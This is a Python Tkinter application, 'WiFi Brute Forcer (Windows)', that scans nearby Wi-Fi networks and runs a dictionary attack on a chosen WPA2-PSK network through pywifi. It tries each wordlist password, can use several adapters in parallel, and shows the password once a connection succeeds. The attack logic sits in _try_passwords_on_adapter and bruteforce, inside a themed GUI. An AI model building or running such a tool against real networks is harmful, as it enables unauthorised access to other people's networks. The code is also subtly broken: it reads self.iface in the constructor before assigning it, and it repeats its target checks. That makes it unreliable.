import threading
import time
import tkinter as tk
from tkinter import filedialog, messagebox

try:
    import pywifi
    from pywifi import const
except ImportError:
    raise ImportError("pywifi is required on Windows. Install with 'pip install pywifi'")

import themes # Import the themes module

class WifiBruteForcer:
    def __init__(self, master):
        self.master = master
        master.title("WiFi Brute Forcer (Windows)")
        master.geometry("550x580") # Adjusted for theme selector & padding

        self.current_theme_name = themes.get_season()
        if self.current_theme_name not in themes.THEMES:
            self.current_theme_name = "dark" # Fallback
        themes.set_current_theme_name(self.current_theme_name)

        # --- Theme Selector ---
        self.theme_frame = tk.Frame(master)
        self.theme_label = tk.Label(self.theme_frame, text="Theme:")
        self.theme_label.pack(side=tk.LEFT, padx=5)
        self.theme_var = tk.StringVar(master)
        self.theme_var.set(self.current_theme_name.capitalize())
        theme_options = [name.capitalize() for name in themes.THEMES.keys()]
        self.theme_menu = tk.OptionMenu(self.theme_frame, self.theme_var, *theme_options, command=self.change_theme)
        self.theme_menu.pack(side=tk.LEFT)
        self.theme_frame.pack(pady=10, padx=10, anchor='w')

        # Hidden SSID toggle
        self.hidden_var = tk.BooleanVar()
        self.hidden_frame = tk.Frame(master)
        self.hidden_checkbutton = tk.Checkbutton(self.hidden_frame, text="Hidden SSID", variable=self.hidden_var,
                                                 command=self._toggle_hidden)
        self.hidden_checkbutton.pack(side=tk.LEFT)
        self.manual_ssid_label = tk.Label(self.hidden_frame, text="Manual SSID:")
        self.manual_ssid_label.pack(side=tk.LEFT, padx=(10,0))
        self.ssid_entry = tk.Entry(self.hidden_frame, width=30, state=tk.DISABLED)
        self.ssid_entry.pack(side=tk.LEFT, padx=5)
        self.hidden_frame.pack(pady=5, padx=10, fill=tk.X)

        # Scan and list
        self.scan_btn = tk.Button(master, text="Scan Networks", command=self.scan_networks)
        self.scan_btn.pack(pady=5)
        self.scan_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.scan_btn.bind("<ButtonRelease-1>", self._on_button_release)
        if not self.iface: # Disable scan button if no interface is available
            self.scan_btn.config(state=tk.DISABLED)


        self.network_listbox = tk.Listbox(master, selectmode=tk.SINGLE, width=60, height=8)
        self.network_listbox.pack(pady=5, padx=10, fill=tk.X, expand=True)

        # Dictionary load
        self.load_dict_btn = tk.Button(master, text="Load Dictionary", command=self.load_dictionary)
        self.load_dict_btn.pack(pady=5)
        self.load_dict_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.load_dict_btn.bind("<ButtonRelease-1>", self._on_button_release)

        self.dict_label = tk.Label(master, text="No dictionary loaded")
        self.dict_label.pack(pady=5)

        # Start button
        self.start_btn = tk.Button(master, text="Start Brute Force", command=self.start_bruteforce)
        self.start_btn.pack(pady=10)
        self.start_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.start_btn.bind("<ButtonRelease-1>", self._on_button_release)

        # Status label
        self.status_label = tk.Label(master, text="Status: Idle")
        self.status_label.pack(pady=10)

        # Initialize wifi
        self.wifi = pywifi.PyWiFi()
        try:
            self.all_interfaces = self.wifi.interfaces()
            if not self.all_interfaces:
                messagebox.showerror("Error", "No Wi-Fi interfaces found. Cracking and scanning functionality will be limited.")
                self.iface = None # Explicitly set iface to None
                # self.scan_btn will be disabled later if self.iface is None
            else:
                self.iface = self.all_interfaces[0] # Default to the first interface for scanning
        except Exception as e:
            messagebox.showerror("Error", f"Failed to initialize Wi-Fi interfaces: {e}")
            self.all_interfaces = []
            self.iface = None
            # self.scan_btn will be disabled later if self.iface is None

        # self.iface = wifi.interfaces()[0] # Deprecated, will be handled by selection
        # self.iface is now set above


        # --- Adapter Selection Frame ---
        self.adapter_frame = tk.Frame(master)
        self.adapter_frame.pack(pady=5, padx=10, fill=tk.X)

        self.adapter_label = tk.Label(self.adapter_frame, text="Select Adapter(s):")
        self.adapter_label.pack(side=tk.LEFT, padx=(0, 5))

        self.adapter_listbox = tk.Listbox(self.adapter_frame, selectmode=tk.EXTENDED, width=50, height=3)
        if self.all_interfaces:
            for iface in self.all_interfaces:
                self.adapter_listbox.insert(tk.END, iface.name())
            if self.all_interfaces: # Select the first interface by default
                self.adapter_listbox.selection_set(0)
        else:
            self.adapter_listbox.insert(tk.END, "No interfaces found")
            self.adapter_listbox.config(state=tk.DISABLED)
        self.adapter_listbox.pack(side=tk.LEFT, fill=tk.X, expand=True)

        # --- Mode Selection Frame ---
        self.mode_selection_frame = tk.Frame(master)
        self.mode_selection_frame.pack(pady=5, padx=10, fill=tk.X)

        self.adapter_mode_var = tk.StringVar(value="Single Adapter Mode")
        self.single_adapter_radio = tk.Radiobutton(
            self.mode_selection_frame, text="Single Adapter Mode",
            variable=self.adapter_mode_var, value="Single Adapter Mode",
            command=self._on_adapter_mode_change
        )
        self.single_adapter_radio.pack(side=tk.LEFT, padx=(0, 10))

        self.multi_adapter_radio = tk.Radiobutton(
            self.mode_selection_frame, text="Multiple Adapters Mode",
            variable=self.adapter_mode_var, value="Multiple Adapters Mode",
            command=self._on_adapter_mode_change
        )
        self.multi_adapter_radio.pack(side=tk.LEFT)

        # --- Secondary Dictionary Frame ---
        self.secondary_dict_frame = tk.Frame(master)
        # Packed later by _on_adapter_mode_change

        self.load_secondary_dict_btn = tk.Button(
            self.secondary_dict_frame, text="Load Secondary Dictionary",
            command=self.load_secondary_dictionary
        )
        self.load_secondary_dict_btn.pack(side=tk.LEFT, pady=5)
        self.load_secondary_dict_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.load_secondary_dict_btn.bind("<ButtonRelease-1>", self._on_button_release)

        self.secondary_dict_label = tk.Label(self.secondary_dict_frame, text="No secondary dictionary loaded")
        self.secondary_dict_label.pack(side=tk.LEFT, pady=5, padx=5)

        self.networks = []
        self.dictionary = []
        self.secondary_dictionary = []
        self.secondary_dict_path = ""


        self.apply_current_theme() # Apply theme after all widgets are created
        self._on_adapter_mode_change() # Call once to set initial state of UI elements

    def _on_button_press(self, event):
        widget = event.widget
        if widget.cget('state') == tk.DISABLED:
            return
        current_palette = themes.get_current_theme()
        widget.config(
            relief=tk.SUNKEN,
            bg=current_palette.get("btn_active_bg"), # Use active color on press
            fg=current_palette.get("fg_color") # Ensure fg color remains consistent
        )

    def _on_button_release(self, event):
        widget = event.widget
        if widget.cget('state') == tk.DISABLED:
            # If button became disabled while pressed, it might not get themed correctly by apply_current_theme
            # So, explicitly apply standard button theme here if it's now disabled.
            # However, standard flow is that apply_current_theme handles disabled state.
            # This is more of a fallback.
            self.apply_current_theme() # Re-apply theme to ensure it's correct
            return

        current_palette = themes.get_current_theme()
        # themes.apply_theme_to_widget will set relief, bg, fg, activebackground, activeforeground
        themes.apply_theme_to_widget(widget, current_palette)


    def change_theme(self, selected_theme_capitalized):
        new_theme_name = selected_theme_capitalized.lower()
        themes.set_current_theme_name(new_theme_name)
        self.current_theme_name = new_theme_name
        self.apply_current_theme()

    def apply_current_theme(self):
        current_palette = themes.get_current_theme()
        self.master.configure(bg=current_palette.get("bg_color"))

        themes.apply_recursively(self.master, current_palette)

        if hasattr(self, 'theme_menu'):
            self.theme_menu.config(
                bg=current_palette.get("btn_bg"),
                fg=current_palette.get("fg_color"),
                activebackground=current_palette.get("btn_active_bg"),
                highlightthickness=0
            )
            menu_widget_name = self.theme_menu.menuname
            try:
                menu = self.theme_menu.nametowidget(menu_widget_name)
                menu.config(
                    bg=current_palette.get("entry_bg"),
                    fg=current_palette.get("fg_color"),
                    activebackground=current_palette.get("select_bg"),
                    activeforeground=current_palette.get("fg_color"),
                    relief=tk.FLAT
                )
            except tk.TclError:
                 # This can happen if the menu hasn't been created yet or is destroyed.
                pass # Silently ignore, or log if necessary

        self._update_widget_states_for_theme()

        # Explicitly re-theme listbox items if a theme change occurs
        if hasattr(self, 'network_listbox') and self.network_listbox.size() > 0:
            # When the theme changes, we need to update all existing items.
            # The _animate_list_item_in function will correctly use the new theme
            # for items that are still in their animation queue.
            # For items already visible, we update them here.
            for i in range(self.network_listbox.size()):
                # We only update items that are not currently in the "hidden" state of the initial animation.
                # An item is "hidden" if its fg is the same as its bg.
                current_item_fg = self.network_listbox.itemcget(i, "fg")
                current_item_bg = self.network_listbox.itemcget(i, "background")

                is_hidden_for_animation = (current_item_fg == current_item_bg) and \
                                          (current_item_bg != "") # Ensure it's not default uncolored

                if not is_hidden_for_animation:
                    self.network_listbox.itemconfig(i, {
                        'bg': current_palette.get("listbox_bg"), # Normal items match listbox background
                        'fg': current_palette.get("fg_color"),
                        'selectbackground': current_palette.get("select_bg"),
                        'selectforeground': current_palette.get("fg_color") # Ensure selected text is also themed
                    })
                # If it's_hidden_for_animation, its scheduled _animate_list_item_in will apply the new theme.

    def _update_widget_states_for_theme(self):
        current_palette = themes.get_current_theme()

        # SSID Entry
        if self.ssid_entry.cget('state') == tk.DISABLED:
            self.ssid_entry.config(
                disabledbackground=current_palette.get("entry_bg"),
                disabledforeground=current_palette.get("fg_color") # Consider a dimmer color for text if needed
            )
        else: # NORMAL
            self.ssid_entry.config(
                bg=current_palette.get("entry_bg"),
                fg=current_palette.get("fg_color"),
                insertbackground=current_palette.get("fg_color")
            )

        # Network Listbox - state handling is mostly visual through bg/fg
        # Tkinter Listbox doesn't have disabledbackground/disabledforeground
        # Its appearance when "disabled" (i.e., not interactive) is controlled by its standard bg/fg.
        for listbox_widget in [self.network_listbox, self.adapter_listbox]:
            if listbox_widget.cget('state') == tk.DISABLED:
                # For a disabled listbox, we might want a slightly different look,
                # e.g., a dimmed foreground or background, but Tkinter's default
                # is often just to make it non-interactive.
                # We'll use the standard listbox_bg but perhaps a more muted fg.
                # For now, let's stick to the theme's listbox_bg and fg_color
                # as Tkinter doesn't offer separate disabled colors for Listbox.
                listbox_widget.config(
                    bg=current_palette.get("listbox_bg"),
                    fg=current_palette.get("fg_color"), # Or a dimmer color if desired
                    # selectbackground/selectforeground are less relevant for disabled
                )
            else:
                listbox_widget.config(
                    bg=current_palette.get("listbox_bg"),
                    fg=current_palette.get("fg_color"),
                    selectbackground=current_palette.get("select_bg"),
                    selectforeground=current_palette.get("fg_color") # Ensure selected item text is also themed
                )

    def _toggle_hidden(self):
        is_hidden = self.hidden_var.get()
        new_ssid_state = tk.NORMAL if is_hidden else tk.DISABLED
        new_scan_btn_state = tk.DISABLED if is_hidden else tk.NORMAL
        # Network listbox state is conceptually linked to scan button usability
        new_listbox_state = tk.DISABLED if is_hidden else tk.NORMAL


        self.ssid_entry.config(state=new_ssid_state)
        self.scan_btn.config(state=new_scan_btn_state)
        # For Listbox, 'state' isn't a standard option affecting appearance directly like Entry.
        # Its interactivity is implicitly controlled by disabling scan_btn.
        # We'll rely on _update_widget_states_for_theme to set its appearance.

        if not is_hidden:
            self.ssid_entry.delete(0, tk.END)

        self.apply_current_theme()

    def scan_networks(self):
        self.network_listbox.delete(0, tk.END)
        self.status_label.config(text="Status: Scanning...")
        # Ensure status label is themed immediately
        if hasattr(self, 'current_theme_name'): # Check if theming is initialized
             themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())

        if not self.iface:
            messagebox.showerror("Error", "No Wi-Fi interface available for scanning.")
            self.status_label.config(text="Status: Error - No Wi-Fi adapter")
            if hasattr(self, 'current_theme_name'):
                 themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
            return

        try:
            self.iface.scan()
            time.sleep(2) # Already present, seems reasonable for pywifi
            results = self.iface.scan_results()
            ssids = sorted({net.ssid for net in results if net.ssid})
            self.networks = ssids

            current_palette = themes.get_current_theme()
            listbox_bg = current_palette.get("listbox_bg", "#3e3e3e")
            listbox_fg = current_palette.get("fg_color", "#ffffff") # Standard text color

            if not ssids:
                self.status_label.config(text="Status: No networks found")
            else:
                self.status_label.config(text=f"Status: Found {len(ssids)} networks, populating...")

                for i, ssid in enumerate(ssids):
                    # Insert initially "invisible" (colors match listbox bg)
                    self.network_listbox.insert(tk.END, ssid)
                    self.network_listbox.itemconfig(tk.END, {'bg': listbox_bg, 'fg': listbox_bg})

                    # Schedule the "fade-in"
                    self.master.after(
                        50 * (i + 1), # Staggered delay for cascade effect
                        lambda index=i, item_ssid=ssid: self._animate_list_item_in(index, item_ssid)
                    )
            # Final status update after loop (or if no ssids)
            # self.status_label.config(text=f"Status: Found {len(ssids)} networks") # Already set or handled
        except Exception as e:
            messagebox.showerror("Error", f"Failed to scan: {e}")
            self.status_label.config(text="Status: Error scanning")
        finally:
            if hasattr(self, 'current_theme_name'): # Re-apply theme to status label
                 themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())

    def _on_adapter_mode_change(self):
        mode = self.adapter_mode_var.get()
        self.adapter_listbox.selection_clear(0, tk.END)

        if mode == "Single Adapter Mode":
            self.adapter_listbox.config(selectmode=tk.SINGLE)
            self.secondary_dict_frame.pack_forget()
            if self.all_interfaces: # Reselect first one if available
                self.adapter_listbox.selection_set(0)
        elif mode == "Multiple Adapters Mode":
            self.adapter_listbox.config(selectmode=tk.EXTENDED)
            self.secondary_dict_frame.pack(pady=5, padx=10, fill=tk.X, before=self.scan_btn) # Pack it before scan button
            if self.all_interfaces: # Reselect first one if available
                self.adapter_listbox.selection_set(0)

        if hasattr(self, 'current_theme_name'): # Ensure new/changed widgets are themed
            self.apply_current_theme()


    def load_secondary_dictionary(self):
        path = filedialog.askopenfilename(title="Select secondary dictionary file",
                                          filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if path:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.secondary_dictionary = [line.strip() for line in f if line.strip()]
            self.secondary_dict_path = path
            self.secondary_dict_label.config(text=f"Sec. Dictionary: {path} ({len(self.secondary_dictionary)} entries)")
            if hasattr(self, 'current_theme_name'):
                 themes.apply_theme_to_widget(self.secondary_dict_label, themes.get_current_theme())
                 themes.apply_theme_to_widget(self.load_secondary_dict_btn, themes.get_current_theme())


    def _animate_list_item_in(self, index, ssid_text):
        # This method is called by 'after' to finalize item appearance
        # Ensure the item at 'index' still corresponds to 'ssid_text' if list can change dynamically,
        # though for this specific scan, the list is static once scan_results are processed.
        try:
            current_palette = themes.get_current_theme()
            # Get the actual text of the item at the index to be safe, though not strictly necessary here
            # current_item_text = self.network_listbox.get(index)
            # if current_item_text == ssid_text:
            self.network_listbox.itemconfig(
                index,
                {
                    'bg': current_palette.get("listbox_bg"),
                    'fg': current_palette.get("fg_color"),
                    'selectbackground': current_palette.get("select_bg"),
                    'selectforeground': current_palette.get("fg_color") # Or a specific select fg
                }
            )
        except tk.TclError:
            # This can happen if the listbox is cleared or modified before animation completes.
            # print(f"TclError during list item animation for index {index}")
            pass


    def load_dictionary(self):
        path = filedialog.askopenfilename(title="Select dictionary file",
                                          filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if path:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.dictionary = [line.strip() for line in f if line.strip()]
            self.dict_label.config(text=f"Dictionary: {path} ({len(self.dictionary)} entries)")
            if hasattr(self, 'current_theme_name'): # Theme dict_label
                 themes.apply_theme_to_widget(self.dict_label, themes.get_current_theme())


    def start_bruteforce(self):
        if self.hidden_var.get():
            ssid = self.ssid_entry.get().strip()
            if not ssid:
                messagebox.showwarning("Warning", "Enter the hidden SSID first.")
                return
        else:
            sel = self.network_listbox.curselection()
            if not sel:
                messagebox.showwarning("Warning", "Please select a network to attack.")
                return
            ssid = self.networks[sel[0]]

        if not self.dictionary:
            messagebox.showwarning("Warning", "Please load a password dictionary.")
            return

        # Determine selected network
        if self.hidden_var.get():
            target_ssid = self.ssid_entry.get().strip()
            if not target_ssid:
                messagebox.showwarning("Warning", "Enter the hidden SSID first.")
                return
        else:
            sel_network = self.network_listbox.curselection()
            if not sel_network:
                messagebox.showwarning("Warning", "Please select a network to attack.")
                return
            target_ssid = self.networks[sel_network[0]]

        # Determine selected adapters
        selected_adapter_indices = self.adapter_listbox.curselection()
        if not selected_adapter_indices:
            messagebox.showwarning("Warning", "Please select at least one adapter.")
            return

        selected_interfaces = [self.all_interfaces[i] for i in selected_adapter_indices]

        # Determine which dictionary to use
        current_mode = self.adapter_mode_var.get()
        chosen_dictionary = self.dictionary
        dict_source = "primary"

        if current_mode == "Multiple Adapters Mode" and self.secondary_dictionary:
            chosen_dictionary = self.secondary_dictionary
            dict_source = "secondary"

        if not chosen_dictionary:
            messagebox.showwarning("Warning", f"Please load the {dict_source} password dictionary.")
            return

        # Validate adapter selection based on mode
        if current_mode == "Single Adapter Mode":
            if len(selected_interfaces) > 1:
                # This case should ideally not happen if listbox selectmode is SINGLE
                # and _on_adapter_mode_change clears/sets one selection.
                # However, as a safeguard:
                messagebox.showwarning("Warning", "Single Adapter Mode: Please select only one adapter.")
                return
            interfaces_to_use = selected_interfaces[0] # Pass single interface object
        else: # Multiple Adapters Mode
            if not selected_interfaces: # Should be caught by earlier check but good to be robust
                 messagebox.showwarning("Warning", "Multiple Adapter Mode: Please select adapter(s).")
                 return
            interfaces_to_use = selected_interfaces # Pass list of interfaces

        t = threading.Thread(target=self.bruteforce, args=(target_ssid, self.hidden_var.get(), interfaces_to_use, chosen_dictionary))
        t.daemon = True
        t.start()

    def _try_passwords_on_adapter(self, adapter_iface, ssid, hidden, dictionary_to_use, password_found_event):
        adapter_name = adapter_iface.name()
        self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Starting attack on {ssid}"))
        if hasattr(self, 'current_theme_name'):
            self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))

        for pwd_idx, pwd in enumerate(dictionary_to_use):
            if password_found_event.is_set():
                self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Stopping, password found by another adapter."))
                if hasattr(self, 'current_theme_name'):
                    self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
                return

            self.master.after(0, lambda current_pwd=pwd: self.status_label.config(text=f"Adapter '{adapter_name}': Trying {current_pwd}"))
            if hasattr(self, 'current_theme_name'):
                 self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))

            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            if hidden:
                try:
                    profile.hidden = True
                except AttributeError:
                    pass # Older pywifi might not have this

            # It's crucial that each adapter manages its own profiles.
            adapter_iface.remove_all_network_profiles()
            tmp_profile = adapter_iface.add_network_profile(profile)
            adapter_iface.connect(tmp_profile)

            # Connection attempt timeout - adjust as needed. Shorter for multi-adapter?
            # For now, let's keep it at 3, but this could be a point of optimization.
            connect_time = 0
            max_connect_time = 5 # Increased slightly for stability
            while connect_time < max_connect_time:
                if adapter_iface.status() == const.IFACE_CONNECTED:
                    break
                if password_found_event.is_set(): # Check again during wait
                    adapter_iface.disconnect() # Ensure disconnected if we bail early
                    return
                time.sleep(0.5)
                connect_time += 0.5

            if adapter_iface.status() == const.IFACE_CONNECTED:
                password_found_event.set() # Signal other threads
                success_msg = f"Connected on '{adapter_name}'!\nSSID: {ssid}\nPassword: {pwd}"
                self.master.after(0, lambda m=success_msg: messagebox.showinfo("Success", m))
                self.master.after(0, lambda: self.status_label.config(text=f"Success on '{adapter_name}'! Pass: {pwd}"))
                if hasattr(self, 'current_theme_name'):
                    self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
                # adapter_iface.disconnect() # Optional: disconnect after finding or keep connected
                return
            else:
                adapter_iface.disconnect()
                # Brief pause, but not too long to slow down multi-adapter significantly
                time.sleep(0.1)

        if not password_found_event.is_set():
            self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Finished, no password found."))
            if hasattr(self, 'current_theme_name'):
                self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))


    def bruteforce(self, ssid, hidden, interfaces_to_use, current_dictionary): # New signature
        self.status_label.config(text=f"Status: Attacking {ssid}...")
        if hasattr(self, 'current_theme_name'):
             themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())

        self.password_found_event = threading.Event()
        threads = []

        if not isinstance(interfaces_to_use, list):
            interfaces_to_use = [interfaces_to_use] # Ensure it's a list

        if not interfaces_to_use:
            messagebox.showerror("Error", "No interfaces selected for bruteforce.")
            self.status_label.config(text="Status: Error - No interfaces")
            return

        for iface_obj in interfaces_to_use:
            thread = threading.Thread(target=self._try_passwords_on_adapter,
                                      args=(iface_obj, ssid, hidden, current_dictionary, self.password_found_event))
            thread.daemon = True
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join() # Wait for all threads to complete

        if self.password_found_event.is_set():
            # Success message already shown by the thread that found it
            self.master.after(0, lambda: self.status_label.config(text="Status: Password Found!"))
        else:
            self.master.after(0, lambda: messagebox.showinfo("Finished", f"Brute force complete for {ssid}, no password found with selected adapter(s)."))
            self.master.after(0, lambda: self.status_label.config(text="Status: Finished - No password found"))

        if hasattr(self, 'current_theme_name'):
            self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))


if __name__ == "__main__":
    root = tk.Tk()
    app = WifiBruteForcer(root)
    root.mainloop()
